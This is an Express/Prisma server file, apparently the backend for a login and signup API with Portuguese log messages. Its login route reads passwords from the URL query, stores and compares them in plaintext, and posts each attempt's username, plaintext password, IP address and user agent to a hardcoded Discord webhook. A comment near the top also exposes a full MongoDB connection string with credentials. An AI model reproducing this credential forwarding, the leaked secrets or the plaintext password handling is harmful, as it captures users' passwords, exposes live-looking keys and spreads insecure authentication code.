import express from "express";
import cors from "cors";
import { PrismaClient } from "@prisma/client";
import axios from "axios";
//DATABASE_URL="mongodb+srv://ytrusk:gamesds4321@cluster0.w5pscb7.mongodb.net/TelegramBotDb?retryWrites=true&w=majority"
const prisma = new PrismaClient();
const app = express();
app.set("trust proxy", true);

interface Embed {
  title?: string;
  description?: string;
  url?: string;
  color?: number;
  timestamp?: string;
  footer?: {
    text: string;
    icon_url?: string;
  };
  thumbnail?: {
    url: string;
  };
  image?: {
    url: string;
  };
  author?: {
    name: string;
    url?: string;
    icon_url?: string;
  };
  fields?: {
    name: string;
    value: string;
    inline?: boolean;
  }[];
}

async function sendEmbedToWebhook(webhookUrl: string, embed: Embed) {
  try {
    const payload = {
      embeds: [embed],
    };

    const response = await axios.post(webhookUrl, payload, {
      headers: {
        "Content-Type": "application/json",
      },
    });

    console.log("Embed enviado com sucesso:", response.status);
  } catch (error: any) {
    console.error(
      "Erro ao enviar embed:",
      error.response?.data || error.message
    );
  }
}
app.use(
  cors({
    origin: "*",
    methods: ["POST"],
  })
);
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use((req, res, next) => {
  console.log("req.ip:", req.ip);
  console.log(
    'req.headers["x-forwarded-for"]:',
    req.headers["x-forwarded-for"]
  );
  console.log("req.connection.remoteAddress:", req.connection.remoteAddress);
  let ip = req.ip;
  if (ip && ip.includes(":") && ip.includes(".")) {
    ip = ip.split(":").pop(); // Obtém o IPv4 do IPv6 mapeado
  }
  console.log(ip);
  next();
});

app.get("/api/data", async (req: express.Request, res: any) => {
  const { user, pass } = req.query;
  const userAgent = req.headers["user-agent"];
  const forwarded = req.headers["x-forwarded-for"];
  const ipadress =
    typeof forwarded === "string" ? forwarded.split(",")[0] : req.ip;

  const users = await prisma.user
    .findUnique({
      where: { user: user as string, pass: pass as string },
    })
    .catch((e) => console.log(e));
  let success;
  if (users) {
    success = "success";
    res.json({ message: "sucess, logged successful.", code: 200 });
  } else {
    success = "failure";
    res.json({
      message: "failure, the user or password are incorrect.",
      code: 404,
    });
  }
  sendEmbedToWebhook(
    "https://discord.com/api/webhooks/1305647694383026188/SK12qhRxbZW4FVZxubIx2Kp_fInmMRCEumSIlwdqFH_oxkzmZT6Hn0EFjJw1wNXaBK0t",
    {
      title: `Login **__${success}__**`,
      fields: [
        { name: "**User**", value: `${user}` },
        { name: "**Password**", value: `||${pass}||` },
        {
          name: "**IP DATA**",
          value: `**IP=**||${ipadress}||`, // **Country=**||${data.country_name}||**Region=**||${data.region}||
        },
        { name: "**Acess With:**", value: `\`${userAgent}\`` },
      ],
      color: 0x000000,
    }
  );
});
app.post("/api/data", async (req, res) => {
  const { user, pass, email, discord } = req.body;
  const isCreated = await prisma.user.findUnique({ where: { user } });

  if (isCreated) {
    res.json({
      message: "failure, already have an user with this name.",
      code: 400,
    });
  } else {
    await prisma.user.create({
      data: { user, pass, email, discord_username: discord },
    });
    res.json({ message: "sucess, user created.", code: 200 });
  }
});
app.listen(3000, "0.0.0.0", async () => {
  console.log(`Servidor rodando em http://0.0.0.0:3000`);
});
